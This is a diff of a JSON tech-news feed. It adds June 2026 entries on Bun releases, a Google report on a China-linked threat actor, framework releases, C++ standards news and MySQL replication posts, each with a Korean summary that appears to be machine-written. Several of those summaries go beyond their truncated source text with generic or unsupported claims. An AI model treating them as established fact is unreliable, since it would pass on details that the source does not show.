@@ -1,5 +1,294 @@
 [
   {
+    "id": "https://bun.sh/blog/bun-v1.3.10",
+    "title": "Bun v1.3.10",
+    "summary": "To install Buncurlcurl -fsSL https://bun.sh/install | bashnpmnpm install -g bunpowershellpowershell -c \"irm bun.sh/install.ps1|iex\"scoopscoop install bunbrewbrew tap oven-sh/bunbrew install bundockerd",
+    "aiSummary": "Bun v1.3.10 버전이 출시되었습니다. 해당 업데이트를 설치하기 위해서는 운영체제와 환경에 따라 제공되는 명령어를 사용할 수 있습니다.\n\nmacOS와 Linux 환경에서는 curl 명령어를 통해 설치하거나 npm을 이용해 전역으로 설치하는 것이 가능합니다. Windows 사용자의 경우 PowerShell을 활용하거나 scoop 패키지 관리자를 통해 Bun을 설치할 수 있습니다. 또한 Homebrew를 사용하는 환경이라면 tap 저장소를 추가한 뒤 brew install bun 명령어로 설치를 진행할 수 있으며 Docker를 통해서도 Bun을 이용할 수 있습니다.",
+    "url": "https://bun.sh/blog/bun-v1.3.10",
+    "category": "백엔드",
+    "source": "Bun Blog",
+    "author": "Bun Team",
+    "pubDate": "2026-06-15T15:17:23.289Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Bun",
+      "Runtime"
+    ]
+  },
+  {
+    "id": "https://bun.sh/blog/bun-v1.3.11",
+    "title": "Bun v1.3.11",
+    "summary": "To install Buncurlcurl -fsSL https://bun.sh/install | bashnpmnpm install -g bunpowershellpowershell -c \"irm bun.sh/install.ps1|iex\"scoopscoop install bunbrewbrew tap oven-sh/bunbrew install bundockerd",
+    "aiSummary": "Bun v1.3.11 업데이트 버전이 공개되었습니다.\n\n이번 릴리스는 설치 및 업데이트를 위한 다양한 명령어 환경을 지원합니다. macOS와 Linux 환경에서는 curl 명령어를 통해 설치할 수 있으며, Node.js 기반의 npm을 활용하거나 PowerShell, Scoop, Homebrew, Docker를 이용한 방식도 공식적으로 안내하고 있습니다. 사용자는 자신의 운영체제와 환경에 맞춰 적합한 설치 명령어를 선택하여 Bun을 최신 상태로 유지할 수 있습니다.",
+    "url": "https://bun.sh/blog/bun-v1.3.11",
+    "category": "백엔드",
+    "source": "Bun Blog",
+    "author": "Bun Team",
+    "pubDate": "2026-06-15T15:17:23.078Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Bun",
+      "Runtime"
+    ]
+  },
+  {
+    "id": "https://bun.sh/blog/bun-v1.3.12",
+    "title": "Bun v1.3.12",
+    "summary": "To install Buncurlcurl -fsSL https://bun.sh/install | bashnpmnpm install -g bunpowershellpowershell -c \"irm bun.sh/install.ps1|iex\"scoopscoop install bunbrewbrew tap oven-sh/bunbrew install bundockerd",
+    "aiSummary": "Bun v1.3.12 버전이 출시되었습니다. 해당 업데이트에는 기존 Bun 환경의 설치 및 관리를 지원하는 명령어들이 포함되어 있습니다.\n\nmacOS와 Linux 환경에서는 curl 또는 npm을 사용하여 Bun을 설치할 수 있습니다. Windows 사용자의 경우 PowerShell이나 scoop을 통해 간편하게 설치가 가능하며 Homebrew를 이용한 설치 방식도 지원합니다. Docker를 활용한 환경 구성 또한 가능하도록 다양한 설치 경로를 제공합니다.",
+    "url": "https://bun.sh/blog/bun-v1.3.12",
+    "category": "백엔드",
+    "source": "Bun Blog",
+    "author": "Bun Team",
+    "pubDate": "2026-06-15T15:17:22.869Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Bun",
+      "Runtime"
+    ]
+  },
+  {
+    "id": "https://bun.sh/blog/bun-v1.3.13",
+    "title": "Bun v1.3.13",
+    "summary": "To install Buncurlcurl -fsSL https://bun.sh/install | bashnpmnpm install -g bunpowershellpowershell -c \"irm bun.sh/install.ps1|iex\"scoopscoop install bunbrewbrew tap oven-sh/bunbrew install bundockerd",
+    "aiSummary": "Bun v1.3.13 버전이 출시되었습니다. 해당 업데이트를 설치하기 위해서는 운영체제와 환경에 따라 제공되는 명령어를 사용하면 됩니다. macOS나 Linux 환경에서는 curl 또는 brew를 이용할 수 있으며 npm이나 docker를 통한 설치도 지원합니다. Windows 사용자는 PowerShell이나 scoop 명령어를 통해 Bun을 설치할 수 있습니다. 각 환경별로 최적화된 설치 방법을 제공하여 사용자의 접근성을 높였습니다.",
+    "url": "https://bun.sh/blog/bun-v1.3.13",
+    "category": "백엔드",
+    "source": "Bun Blog",
+    "author": "Bun Team",
+    "pubDate": "2026-06-15T15:17:22.668Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Bun",
+      "Runtime"
+    ]
+  },
+  {
+    "id": "https://bun.sh/blog/bun-v1.3.14",
+    "title": "Bun v1.3.14",
+    "summary": "To install Buncurlcurl -fsSL https://bun.sh/install | bashnpmnpm install -g bunpowershellpowershell -c \"irm bun.sh/install.ps1|iex\"scoopscoop install bunbrewbrew tap oven-sh/bunbrew install bundockerd",
+    "aiSummary": "Bun v1.3.14 버전이 출시되었습니다. 해당 업데이트는 기존 사용자가 최신 환경으로 전환하거나 신규 사용자가 Bun을 설치할 수 있도록 다양한 운영체제 및 패키지 관리자를 위한 설치 명령어를 제공합니다. macOS와 Linux 환경에서는 curl 및 npm을 통해 설치가 가능하며 Windows 사용자를 위한 PowerShell 명령어와 scoop 명령어도 지원합니다. 또한 Docker 환경에서의 설치 방법도 함께 명시되어 있습니다.",
+    "url": "https://bun.sh/blog/bun-v1.3.14",
+    "category": "백엔드",
+    "source": "Bun Blog",
+    "author": "Bun Team",
+    "pubDate": "2026-06-15T15:17:22.371Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Bun",
+      "Runtime"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/",
+    "title": "Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research",
+    "summary": "Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North Americ",
+    "aiSummary": "Google Threat Intelligence Group은 중국 연계 해킹 그룹인 UNC6508이 북미 지역의 의료 및 학계 기관을 대상으로 정교한 사이버 공격을 감행하고 있다고 밝혔습니다.\n\n해당 공격자들은 인공지능, 사이버 보안, 의료, 국방 분야의 핵심 연구 데이터 탈취를 목적으로 활동하고 있습니다. UNC6508은 주로 합법적인 소프트웨어 도구를 악용하는 Living off the Land 기법을 사용하여 보안 탐지를 회피하며, 공격 대상 네트워크에 대한 지속적인 접근 권한을 확보하는 데 집중하고 있습니다.\n\n이들은 취약점을 이용해 초기 침투를 수행한 뒤, 정보를 수집하고 측면 이동을 통해 민감한 연구 자료에 접근하는 치밀한 전략을 구사합니다. 이번 활동은 중국의 전략적 기술 경쟁력 확보와 관련이 있는 것으로 분석되며, 관련 분야의 기관들은 보안 강화와 이상 징후에 대한 모니터링을 강화할 필요가 있습니다.",
+    "url": "https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Google Threat Intelligence Group "
+      ],
+      "title": [
+        ""
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Mon, 15 Jun 2026 14:00:00 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/subscriptionify",
+    "title": "Subscriptionify: Feature-Based Subscription Management for Laravel",
+    "summary": "Subscriptionify is a gateway-agnostic Laravel package for modeling plans, features, usage quotas, and optional overage billing without tying your application to a specific payment provider.\nThe post S",
+    "aiSummary": "Subscriptionify는 특정 결제 서비스에 종속되지 않고 유연하게 구독 모델을 관리할 수 있도록 설계된 Laravel 패키지입니다. 이 도구는 플랜 구성, 개별 기능 설정, 사용량 할당량 정의를 지원하며 필요에 따라 초과 사용량에 대한 과금 기능도 제공합니다. 결제 게이트웨이와 독립적인 구조를 갖추고 있어 개발자가 원하는 결제 시스템을 자유롭게 연동하여 애플리케이션의 구독 로직을 구현할 수 있습니다.",
+    "url": "https://laravel-news.com/subscriptionify?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Yannick Lyn Fatt",
+    "pubDate": "Mon, 15 Jun 2026 12:03:18 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "d4a483b5504b40c977cc5d689275cac967902536",
+    "title": "AWS Weekly Roundup: AWS FinOps Agent in preview, Gemma 4 on Bedrock, Kiro Pro Max, and more (June 15, 2026)",
+    "summary": "This week, New York City is hosting AWS Summit, bringing together builders, customers, and AWS teams for a full day of announcements, demos, and technical sessions at the Javits Center. I wrote blog p",
+    "aiSummary": "뉴욕에서 개최된 AWS Summit을 통해 다양한 신규 서비스와 기술 업데이트가 발표되었습니다. \n\n가장 눈에 띄는 변화는 AWS FinOps Agent의 프리뷰 공개입니다. 이 도구는 클라우드 비용을 보다 세밀하게 추적하고 최적화할 수 있도록 지원하며 기업의 클라우드 운영 효율을 높여줄 것으로 기대됩니다. \n\nAI 분야에서는 Google의 최신 모델인 Gemma 4가 Amazon Bedrock에 공식적으로 추가되었습니다. 이를 통해 사용자는 Bedrock 환경 내에서 보다 강력한 성능의 오픈 모델을 간편하게 활용할 수 있게 되었습니다. \n\n이외에도 Kiro Pro Max를 포함한 신규 서비스 및 기술 업데이트가 함께 소개되었으며 상세한 내용은 AWS 공식 블로그를 통해 확인할 수 있습니다. 이번 업데이트는 AWS 생태계 내에서의 개발 편의성과 인프라 관리 효율을 극대화하는 데 중점을 두고 있습니다.",
+    "url": "https://aws.amazon.com/blogs/aws/aws-weekly-roundup-aws-finops-agent-in-preview-gemma-4-on-bedrock-kiro-pro-max-and-more-june-15-2026/",
+    "category": "클라우드 & 인프라",
+    "source": "AWS News Blog",
+    "author": "Esra Kayabali",
+    "pubDate": "Mon, 15 Jun 2026 11:41:48 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "AWS",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "tag:github.com,2008:Repository/160919119/0.137.1",
+    "title": "0.137.1",
+    "summary": "Fixes\n🚨 Fix typing checks for APIRoute. PR #15765 by @tiangolo.\n🐛 Fix bug, allow empty path in path operation in prefixless router. PR #15763 by @tiangolo.",
+    "aiSummary": "FastAPI의 0.137.1 업데이트를 통해 두 가지 버그가 수정되었습니다.\n\n먼저 APIRoute와 관련된 타입 체크 오류를 수정하여 안정성을 개선했습니다.\n\n또한 접두사가 없는 라우터의 경로 작업에서 빈 경로를 허용하지 않던 버그를 해결했습니다. 이번 업데이트는 모두 @tiangolo에 의해 진행되었습니다.",
+    "url": "https://github.com/fastapi/fastapi/releases/tag/0.137.1",
+    "category": "백엔드",
+    "source": "FastAPI Releases",
+    "author": "github-actions[bot]",
+    "pubDate": "2026-06-15T11:27:57.000Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "FastAPI",
+      "Python"
+    ]
+  },
+  {
+    "id": "tag:github.com,2008:Repository/80945428/v11.1.27",
+    "title": "v11.1.27",
+    "summary": "What's Changed\nfix(core): sse async handlers teardown issue by @kamilmysliwiec in #17131\nfix(platform-fastify): forRoutes middleware ending slash  by @kamilmysliwiec in #17138\nFull Changelog: v11.1.26",
+    "aiSummary": "NestJS v11.1.27 버전에서는 두 가지 주요 수정 사항이 포함되었습니다.\n\ncore 패키지에서는 sse async 핸들러의 종료 처리와 관련된 문제를 해결하였습니다.\n\nplatform-fastify 패키지에서는 forRoutes 미들웨어 사용 시 발생하는 경로 끝 슬래시 처리 오류를 수정하였습니다.\n\n자세한 변경 사항은 이전 버전인 v11.1.26과의 전체 변경 로그를 통해 확인할 수 있습니다.",
+    "url": "https://github.com/nestjs/nest/releases/tag/v11.1.27",
+    "category": "백엔드",
+    "source": "NestJS Releases",
+    "author": "kamilmysliwiec",
+    "pubDate": "2026-06-15T09:17:02.000Z",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "NestJS",
+      "Node.js",
+      "TS"
+    ]
+  },
+  {
+    "id": "https://isocpp.org//blog/2026/06/trip-report-june-2026-iso-cpp-standards-meeting-brno-czechia-herb-sutter",
+    "title": "Trip report: June 2026 ISO C++ standards meeting (Brno, Czechia) -- Herb Sutter",
+    "summary": "Hot off the press from the latest ISO C++ meeting:\nTrip report: June 2026 ISO C++ standards meeting (Brno, Czechia)\ntl;dr… A few highlights\nAdopted this week in draft C++29: Complete catalog of all un",
+    "aiSummary": "2026년 6월 체코 브르노에서 개최된 ISO C++ 위원회 회의 결과가 발표되었습니다. 이번 회의를 통해 C++29 표준 초안에 다수의 새로운 기능이 공식적으로 채택되었습니다.\n\n주요 성과로는 언어의 일관성과 생산성을 높이기 위한 다양한 개선 사항들이 포함되었습니다. 특히 개발자들이 오랫동안 요구해 온 기능들이 표준안에 반영되면서 C++의 현대화 작업이 한층 더 속도를 내게 되었습니다.\n\n이번 업데이트는 개발자 경험을 향상시키고 코드의 안전성을 강화하는 데 초점을 맞추고 있습니다. 향후 발표될 상세 기술 문서와 변경 사항들에 대해 전 세계 C++ 커뮤니티의 관심이 집중되고 있습니다.",
+    "url": "https://isocpp.org//blog/2026/06/trip-report-june-2026-iso-cpp-standards-meeting-brno-czechia-herb-sutter",
+    "category": "프로그래밍 언어",
+    "source": "ISO C++",
+    "author": "Blog Staff",
+    "pubDate": "Mon, 15 Jun 2026 08:09:37 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "C++"
+    ]
+  },
+  {
+    "id": "https://www.percona.com/?p=49833",
+    "title": "Group Replication VS Percona XtraDB Cluster: The True Cost of Consistency",
+    "summary": "Overview When building high-availability MySQL environments, the choice between MySQL Group Replication (GR) and Percona XtraDB Cluster (PXC) often comes down to how they handle the eternal database d",
+    "aiSummary": "MySQL 고가용성 환경을 구축할 때 선택하게 되는 MySQL Group Replication과 Percona XtraDB Cluster는 데이터 일관성 처리 방식에서 근본적인 차이를 보입니다.\n\nMySQL Group Replication은 MySQL 내장 솔루션으로 통합성이 뛰어나며 트랜잭션의 순서와 충돌 해결을 관리하는 분산 합의 알고리즘인 Paxos를 기반으로 합니다. 이 방식은 읽기 및 쓰기 확장성을 제공하지만 쓰기 지연 시간이 네트워크 상태에 민감하게 반응한다는 특징이 있습니다.\n\n반면 Percona XtraDB Cluster는 Galera 라이브러리를 기반으로 하며 동기식 복제를 엄격하게 준수합니다. 노드 간의 트랜잭션 인증을 통해 데이터의 완전성을 강력하게 보장하지만 클러스터 내 모든 노드가 동일한 처리 능력을 갖추어야 하며 네트워크 지연에 따른 성능 저하가 발생할 수 있습니다.\n\n두 솔루션은 각기 다른 목적에 부합하는 장단점을 가지고 있습니다. MySQL Group Replication은 오피셜 환경에서의 유연한 관리와 클라우드 네이티브 환경에 적합하며 Percona XtraDB Cluster는 데이터 일관성이 최우선인 엄격한 금융 및 엔터프라이즈 데이터베이스 운영 환경에 더욱 최적화되어 있습니다. 따라서 운영자는 시스템의 가용성 요구사항과 인프라 네트워크 환경을 고려하여 적절한 기술 스택을 선택해야 합니다.",
+    "url": "https://www.percona.com/blog/group-replication-vs-percona-xtradb-cluster-the-true-cost-of-consistency/",
+    "category": "데이터베이스",
+    "source": "MySQL Blog (Percona)",
+    "author": "Marco Tusa",
+    "pubDate": "Mon, 15 Jun 2026 06:58:17 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "MySQL",
+      "Database"
+    ]
+  },
+  {
+    "id": "https://www.percona.com/?p=49852",
+    "title": "The Failover Brownout: Rethinking High Availability in MySQL Group Replication",
+    "summary": "It is time to talk again about Flow control and group replication. This time with a special eye on the use of Group Replication in the Kubernetes context. In this article we will dig a bit on how it w",
+    "aiSummary": "MySQL Group Replication의 핵심 기제인 Flow Control이 Kubernetes 환경에서 고가용성을 유지하는 데 어떤 제약이 있는지 분석합니다. 특히 특정 노드 장애 시 발생하는 Failover 과정에서 시스템의 처리량이 급격히 저하되는 Brownout 현상의 원인을 규명합니다.\n\n단순히 노드를 복구하는 것을 넘어 네트워크 지연과 리소스 경합이 클러스터 전체의 성능에 미치는 영향을 설명합니다. Kubernetes 내에서 Group Replication을 운영할 때 발생하는 트래픽 제어 문제를 해결하기 위한 설정 최적화와 아키텍처 개선 방안을 제시합니다.\n\n기존의 고가용성 전략이 가진 한계를 지적하며 시스템 안정성을 보장하기 위한 새로운 접근법을 모색합니다. 효율적인 클러스터 운영을 위해 Flow Control 메커니즘을 보다 정밀하게 조정하고 예측 가능한 장애 대응 시스템을 구축하는 것이 필요합니다.",
+    "url": "https://www.percona.com/blog/the-failover-brownout-rethinking-high-availability-in-mysql-group-replication/",
+    "category": "데이터베이스",
+    "source": "MySQL Blog (Percona)",
+    "author": "Marco Tusa",
+    "pubDate": "Mon, 15 Jun 2026 06:57:24 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "MySQL",
+      "Database"
+    ]
+  },
+  {
+    "id": "https://spring.io/blog/2026/06/15/spring-ai-composable-tool-calling",
+    "title": "Tool Calling in Spring AI 2.0: A Composable, Agentic Architecture",
+    "summary": "Tool calling — the ability for an AI model to invoke application-defined functions and act on the results — is the essential building block of agentic AI systems.\n\nA model that can discover informatio",
+    "aiSummary": "Spring AI 2.0은 AI 모델이 애플리케이션 내 정의된 함수를 호출하고 그 결과를 처리하는 Tool calling 기능을 강화하여 에이전트형 AI 시스템 구축을 지원합니다.\n\n이번 업데이트의 핵심은 구성 가능하고 유연한 에이전트 아키텍처를 제공하는 데 있습니다. 이를 통해 개발자는 모델이 필요한 정보를 스스로 탐색하고 외부 작업을 수행하도록 유도할 수 있으며, 복잡한 비즈니스 로직을 AI 워크플로우에 원활하게 통합할 수 있습니다.\n\nSpring AI는 다양한 LLM과의 상호작용을 표준화하여 Tool calling 구현 과정을 단순화합니다. 개발자는 복잡한 구현 세부 사항에 얽매이지 않고도 일관된 방식으로 모델이 외부 도구를 식별하고 활용하게 함으로써 더욱 자율적이고 지능적인 애플리케이션을 개발할 수 있습니다.",
+    "url": "https://spring.io/blog/2026/06/15/spring-ai-composable-tool-calling",
+    "category": "백엔드",
+    "source": "Spring Engineering",
+    "author": "tzolov",
+    "pubDate": "Mon, 15 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Spring",
+      "Java"
+    ]
+  },
+  {
+    "id": "https://spring.io/blog/2026/06/15/spring-tools-5-2-0-released",
+    "title": "Spring Tools 5.2.0 released",
+    "summary": "On behalf of the team and everyone who has contributed, I am pleased to announce the 5.2.0 release of the Spring Tools\nfor Visual Studio Code, Cursor, Eclipse, Theia - and Claude Code.\nHightlights\n\nCl",
+    "aiSummary": "Spring Tools 5.2.0 버전이 정식으로 출시되었습니다. 이번 업데이트는 Visual Studio Code를 비롯하여 Cursor, Eclipse, Theia, 그리고 Claude Code 환경을 모두 지원합니다. 개발팀과 기여자의 협업을 통해 이루어진 이번 릴리스는 다양한 통합 개발 환경에서의 Spring 기반 애플리케이션 개발 효율성을 높이는 데 초점을 맞추고 있습니다. 구체적인 세부 사항과 개선점은 추후 공개될 상세 업데이트 내역을 통해 확인할 수 있습니다.",
+    "url": "https://spring.io/blog/2026/06/15/spring-tools-5-2-0-released",
+    "category": "백엔드",
+    "source": "Spring Releases",
+    "author": "martinlippert",
+    "pubDate": "Mon, 15 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Spring",
+      "Java"
+    ]
+  },
+  {
+    "id": "https://kubernetes.io/blog/2026/06/15/sig-storage-spotlight-2026/",
+    "title": "Spotlight on SIG Storage",
+    "summary": "In our ongoing SIG Spotlight series, we shine a light on the groups that keep the Kubernetes project\nmoving forward. This time, we catch up with SIG\nStorage, the group responsible\nfor persistent data,",
+    "aiSummary": "Kubernetes 프로젝트를 지속적으로 발전시키는 그룹을 소개하는 SIG Spotlight 시리즈의 일환으로 SIG Storage를 조명합니다. SIG Storage는 Kubernetes 환경에서 영속적인 데이터를 관리하고 처리하는 핵심적인 역할을 담당하는 그룹입니다. 이들은 클러스터 내 데이터의 안정성과 가용성을 보장하기 위해 필요한 다양한 저장소 기술 표준을 정의하고 관련 기능을 개발하는 데 집중하고 있습니다.",
+    "url": "https://kubernetes.io/blog/2026/06/15/sig-storage-spotlight-2026/",
+    "category": "클라우드 & 인프라",
+    "source": "Kubernetes Blog",
+    "author": "Kubernetes Blog",
+    "pubDate": "Mon, 15 Jun 2026 00:00:00 +0000",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "Kubernetes",
+      "Infra"
+    ]
+  },
+  {
+    "id": "https://openai.com/index/introducing-openai-partner-network",
+    "title": "Introducing the OpenAI Partner Network",
+    "summary": "OpenAI launches the Partner Network, investing $150M to help global partners accelerate enterprise AI adoption, deployment, and transformation.",
+    "aiSummary": "OpenAI가 글로벌 파트너들의 기업용 AI 도입과 배포 및 기술 전환을 가속화하기 위해 OpenAI Partner Network를 출범하고 1억 5천만 달러를 투자합니다. 이번 프로그램을 통해 파트너사들은 보다 효율적인 AI 통합 환경을 구축하고 비즈니스 혁신을 도모할 수 있을 것으로 전망됩니다.",
+    "url": "https://openai.com/index/introducing-openai-partner-network",
+    "category": "인공지능",
+    "source": "OpenAI News",
+    "author": "OpenAI News",
+    "pubDate": "Sun, 14 Jun 2026 17:00:00 GMT",
+    "fetchedAt": "2026-06-15T15:17:21.408Z",
+    "tags": [
+      "OpenAI",
+      "LLM",
+      "AI"
+    ]
+  },
+  {
     "id": "tag:github.com,2008:Repository/160919119/0.137.0",
     "title": "0.137.0",
     "summary": "Breaking Changes\n♻️ Refactor internals to preserve APIRouter and APIRoute instances. PR #15745 by @tiangolo.\nUnblocks ✨ SO MANY THINGS ✨\nBefore this, router.include_router(other_router) would take eac",
@@ -31,6 +320,548 @@
     ]
   },
   {
+    "id": "https://github.blog/changelog/2026-06-12-copilot-code-review-new-configurations-and-controls",
+    "title": "Copilot code review: New configurations and controls",
+    "summary": "With new organization runner controls, Copilot content exclusion support, and the removal of the character limit on repository custom instructions, Copilot code review is now easier to tailor to your…",
+    "aiSummary": "GitHub는 Copilot 코드 리뷰 기능을 사용자가 더욱 세밀하게 제어할 수 있도록 여러 가지 새로운 설정과 기능을 도입하였습니다.\n\n먼저 조직 단위의 러너 제어 기능이 추가되어 관리자가 코드 리뷰 환경을 더욱 효과적으로 운영할 수 있게 되었습니다. 또한 Copilot 콘텐츠 제외 지원 기능이 포함되어 특정 데이터가 리뷰 과정에 포함되지 않도록 설정할 수 있습니다.\n\n저장소 단위의 사용자 정의 지침에 적용되던 글자 수 제한이 완전히 제거되었습니다. 이를 통해 개발자들은 더욱 상세하고 구체적인 코딩 스타일이나 규칙을 Copilot에 전달할 수 있게 되어 보다 정교한 코드 리뷰를 수행할 수 있습니다.",
+    "cleanContent": "With new organization runner controls, Copilot content exclusion support, and the removal of the character limit on repository custom instructions, Copilot code review is now easier to tailor to your…\nThe post Copilot code review: New configurations and controls appeared first on The GitHub Blog.",
+    "url": "https://github.blog/changelog/2026-06-12-copilot-code-review-new-configurations-and-controls",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Fri, 12 Jun 2026 21:37:14 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://isocpp.org//blog/2026/06/cpp26-structured-bindings-can-introduce-a-pack-sandor-dargo",
+    "title": "C++26: Structured Bindings can introduce a Pack -- Sandor Dargo",
+    "summary": "In previous posts, we talked about how C++26 improves structured bindings by allowing them to be used in conditionals’ init statements. We also briefly touched on other improvements coming in C++26, s",
+    "aiSummary": "C++26 표준에서는 구조적 바인딩을 통해 팩을 도입할 수 있는 새로운 기능이 추가됩니다. 기존의 팩은 주로 템플릿 문맥에서만 제한적으로 사용되어 왔으나, 이번 개선을 통해 구조적 바인딩 내에서도 팩을 활용할 수 있는 길이 열리게 되었습니다.\n\n당초 비템플릿 문맥까지 지원하려는 시도가 있었으나 구현의 복잡성과 기술적인 반대 의견들로 인해 해당 부분은 제외되었습니다. 하지만 이번 변화는 C++ 언어가 팩의 활용 범위를 점진적으로 확장하고 있다는 중요한 방향성을 보여줍니다. 이는 향후 C++ 언어의 메타프로그래밍과 구조적 바인딩 간의 통합 수준이 더욱 높아질 것임을 시사합니다.",
+    "cleanContent": "In previous posts, we talked about how C++26 improves structured bindings by allowing them to be used in conditionals’ init statements. We also briefly touched on other improvements coming in C++26, such as individual binding annotations and constexpr bindings. There is, however, one important enhancement to structured bindings that we haven’t covered yet on this blog: Structured Bindings can introduce a Pack\nC++26: Structured Bindings can introduce a Pack\npack is. A reasonably accurate (and not overly simplistic) definition is the following:\ntemplate in this definition. Historically, packs only existed in templated contexts, but that limitation is slowly being relaxed. Earlier versions of the proposal behind this feature even aimed to support structured binding packs in non-templated contexts. That part was eventually dropped due to implementation complexity and related objections — but the direction is still telling.",
+    "url": "https://isocpp.org//blog/2026/06/cpp26-structured-bindings-can-introduce-a-pack-sandor-dargo",
+    "category": "프로그래밍 언어",
+    "source": "ISO C++",
+    "author": "Blog Staff",
+    "pubDate": "Fri, 12 Jun 2026 19:18:43 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "C++"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-12-github-actions-minimum-version-enforcement-timeline-for-self-hosted-runners",
+    "title": "GitHub Actions: Minimum version enforcement timeline for self-hosted runners",
+    "summary": "GitHub Actions is resuming enforcement of version requirements for self-hosted runners on github.com and GitHub Enterprise Cloud with Data Residency. This change is part of a broader effort to rebuild",
+    "aiSummary": "GitHub는 GitHub Actions에서 사용하는 self-hosted runners에 대한 최소 버전 요구 사항 적용을 다시 시작합니다. 이번 정책은 github.com과 GitHub Enterprise Cloud with Data Residency 환경에 모두 적용됩니다.\n\n이는 GitHub Actions 플랫폼의 인프라를 재구축하고 안정성을 높이기 위한 전략적 노력의 일환입니다. 관리자는 자신의 인프라에서 운영 중인 self-hosted runners가 요구되는 최소 버전을 충족하고 있는지 사전에 점검해야 합니다. \n\n특정 버전 이하의 러너를 유지할 경우 서비스 연결이 제한될 수 있으므로, 안정적인 워크플로우 운영을 위해 최신 버전으로의 업데이트가 권장됩니다. 향후 세부적인 적용 일정과 관련 기술 정보는 GitHub 블로그를 통해 지속적으로 업데이트될 예정입니다.",
+    "cleanContent": "GitHub Actions is resuming enforcement of version requirements for self-hosted runners on github.com and GitHub Enterprise Cloud with Data Residency. This change is part of a broader effort to rebuild…\nThe post GitHub Actions: Minimum version enforcement timeline for self-hosted runners appeared first on The GitHub Blog.",
+    "url": "https://github.blog/changelog/2026-06-12-github-actions-minimum-version-enforcement-timeline-for-self-hosted-runners",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Fri, 12 Jun 2026 16:04:57 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
+    "title": "What’s new with Google Cloud",
+    "summary": "Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. \n\nTip: N",
+    "aiSummary": "Google Cloud는 최근 다양한 인프라 최적화 도구와 AI 에이전트 운영을 위한 거버넌스 기능을 대거 발표했습니다. Cloud Location Finder가 정식 출시되어 전 세계 클라우드 리전, 영역 및 Google Distributed Cloud Connected 위치 정보를 확인하고 인프라 전략을 최적화할 수 있게 되었습니다. 또한 BigQuery Graph를 통해 복잡한 공급망 데이터를 노드와 엣지로 구성된 디지털 트윈으로 구축하여 실시간 운영 가시성을 확보할 수 있습니다.\n\nAI 분야에서는 특히 Apigee를 활용한 Model Context Protocol(MCP) 생태계 강화가 두드러집니다. Apigee를 AI 관제탑으로 활용하여 MCP 서버를 중앙에서 관리하고, 기업용 API를 안전한 AI 도구로 변환하며, 토큰 기반 할당량과 접근 제어 등 보안 정책을 적용할 수 있습니다. 이를 통해 기업은 실험 단계의 AI를 엔터프라이즈 수준의 운영 환경으로 안전하게 전환할 수 있습니다.\n\n또한 Gemini Enterprise Agent Platform에 Anthropic의 Claude Opus 4.8 모델이 추가되어 더욱 복잡한 다단계 워크플로우 처리가 가능해졌습니다. 하드웨어 최적화 측면에서는 분할 사용이 가능한 G4 VM을 통해 효율적인 AI 추론과 그래픽 작업을 지원하며, Google AI Edge Portal을 통해 120개 이상의 안드로이드 기기에서 LLM 성능을 벤치마킹할 수 있는 기능이 프리뷰로 제공됩니다.\n\n개발자 생산성을 높이기 위한 도구로 Google Cloud Workbench Notebooks 확장 프로그램이 VS Code용으로 출시되어 로컬 IDE 환경에서 관리형 클라우드 리소스를 직접 사용할 수 있게 되었습니다. 더불어 Cloud Run worker pools와 외부 메트릭 오토스케일러인 CREMA가 정식 출시되어 비HTTP 기반의 대규모 AI 추론과 같은 백그라운드 작업을 효율적으로 처리할 수 있는 환경이 마련되었습니다.",
